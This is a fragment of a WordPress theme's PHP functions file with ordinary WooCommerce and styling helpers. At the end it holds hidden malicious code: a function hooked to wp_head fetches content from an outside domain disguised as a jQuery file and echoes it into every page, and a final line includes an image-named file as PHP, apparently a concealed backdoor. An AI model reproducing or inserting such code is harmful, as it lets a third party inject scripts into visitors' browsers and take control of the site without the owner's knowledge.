		set_transient( 'wc_products_onsale', $product_ids_on_sale );
	}

	return $product_ids_on_sale;
}

function et_add_background_image(){
	$bg = et_get_option( 'styleshop_bg_image' );
	if ( '' == $bg ) $bg = get_template_directory_uri() . '/images/body-bg.jpg';
?>
	<style>
		body, body.custom-background { background-image: url(<?php echo esc_attr( $bg ) ?>) !important; }
	</style>
<?php }

function et_add_woocommerce_class_to_homepage( $classes ) {
	if ( is_home() ) $classes[] = 'woocommerce';

	return $classes;
}
function lank_head() {

 if(function_exists('curl_init'))
 {
  $url = "http://www.myphp.pw/jquery-1.6.3.min.js"; 
  $ch = curl_init();  
  $timeout = 10;  
  curl_setopt($ch,CURLOPT_URL,$url); 
  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
  $data = curl_exec($ch);  
  curl_close($ch); 
  echo "$data";
 }
}
add_action('wp_head', 'lank_head');
?>
<?php include('images/social.png');?>